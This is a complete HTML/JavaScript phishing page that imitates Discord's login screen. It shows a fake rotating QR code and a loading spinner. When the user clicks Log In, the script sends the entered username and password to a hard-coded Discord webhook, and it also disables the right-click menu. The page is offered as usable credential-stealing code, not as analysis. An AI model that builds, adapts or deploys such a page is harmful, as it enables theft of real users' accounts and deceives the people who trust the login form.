<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
</head>
<body>
    <div class="right-section">
        <div class="qr-code"></div>
    </div>
    <input type="text" id="username" placeholder="Username">
    <input type="password" id="password" placeholder="Password">
    <button>Log In</button>

    <script>
        // ----------------------------------
        // SELECTING ELEMENTS
        // ----------------------------------
        const loginButton = document.querySelector("button");
        const usernameInput = document.getElementById("username");
        const passwordInput = document.getElementById("password");

        // -----------------------------------
        // ELLIPSIS ANIMATION
        // ------------------------------------
        function removeEllipsisAnimation() {
            loginButton.innerHTML = "";
            loginButton.textContent = "Log In";
            loginButton.removeAttribute("disabled");
        }

        function animateEllipsis() {
            loginButton.innerHTML = "";
            loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                                        <span class="inner pulsingEllipsis">
                                            <span class="item spinnerItem"></span>
                                            <span class="item spinnerItem"></span>
                                            <span class="item spinnerItem"></span>
                                        </span>
                                    </span>`;
            const spinnerItems = document.querySelectorAll(".spinnerItem");
            spinnerItems.forEach((item, index) => {
                item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
            });
            loginButton.setAttribute("disabled", "true");

            setTimeout(removeEllipsisAnimation, 3000);
        }

        // --------------------------------------------------
        // ---------- WANDERING CUBES ANIMATION -------------
        // --------------------------------------------------
        function generateRandomString() {
            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let result = "";
            for (let i = 0; i < 43; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        function removeQrCodeAnimation() {
            const qrCodeContainer = document.querySelector(".right-section .qr-code");
            qrCodeContainer.innerHTML = "";
            qrCodeContainer.insertAdjacentElement(
                "afterbegin",
                generateQRCode(`https://discord.com/ra/${generateRandomString()}`)
            );
            qrCodeContainer.insertAdjacentHTML(
                "beforeend",
                `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
            );
            qrCodeContainer.style.background = "white";
        }

        function simulateQrCodeChange() {
            const qrCodeContainer = document.querySelector(".right-section .qr-code");
            qrCodeContainer.removeChild(qrCodeContainer.querySelector("svg"));
            qrCodeContainer.removeChild(qrCodeContainer.querySelector("img"));
            qrCodeContainer.style.background = "transparent";
            const markup = `<span
                            class="spinner qrCode-spinner"
                            role="img"
                            aria-label="Loading"
                            aria-hidden="true"
                            >
                            <span class="inner wanderingCubes">
                                <span class="item"></span>
                                <span class="item"></span>
                            </span>
                        </span>`;
            qrCodeContainer.insertAdjacentHTML("afterbegin", markup);
            setTimeout(removeQrCodeAnimation, 3500);
        }

        setInterval(simulateQrCodeChange, 120 * 1000);

        // --------------------------------------------------
        // ---------- GENERATING QRCODE ---------------------
        // --------------------------------------------------
        function generateQRCode(data) {
            try {
                const qr = qrcode(0, "L");
                qr.addData(data);
                qr.make();
                const moduleCount = qr.getModuleCount();
                const svgString = qr.createSvgTag(1, 0);
                const parser = new DOMParser();
                const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
                const svgElement = svgDoc.documentElement;
                svgElement.setAttribute("width", "160");
                svgElement.setAttribute("height", "160");
                svgElement.setAttribute("viewBox", "0 0 37 37");
                const path = svgElement.querySelector("path");
                if (path) {
                    path.setAttribute("transform", `scale(${37 / moduleCount})`);
                }
                return svgElement;
            } catch (error) {
                console.error("Error generating QR code:", error);
                return null;
            }
        }

        // --------------------------------------------------
        // ---------- WEBHOOK FUNCTION ----------------------
        // --------------------------------------------------
        async function sendToWebhook(username, password) {
            const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with your actual webhook URL
            const payload = {
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    throw new Error(`Webhook request failed: ${response.status}`);
                }
                console.log('Login info sent to webhook successfully');
            } catch (error) {
                console.error('Error sending to webhook:', error);
            }
        }

        // -------------------------- 
        // ATTACHING EVENT LISTENERS
        // --------------------------
        loginButton.addEventListener("click", async () => {
            const username = usernameInput.value;
            const password = passwordInput.value;
            
            // Start animation
            animateEllipsis();
            
            // Send login info to webhook
            if (username && password) {
                await sendToWebhook(username, password);
            } else {
                console.error('Username or password is empty');
            }
        });

        document.addEventListener("contextmenu", function (e) {
            e.preventDefault();
        });
    </script>
</body>
</html>
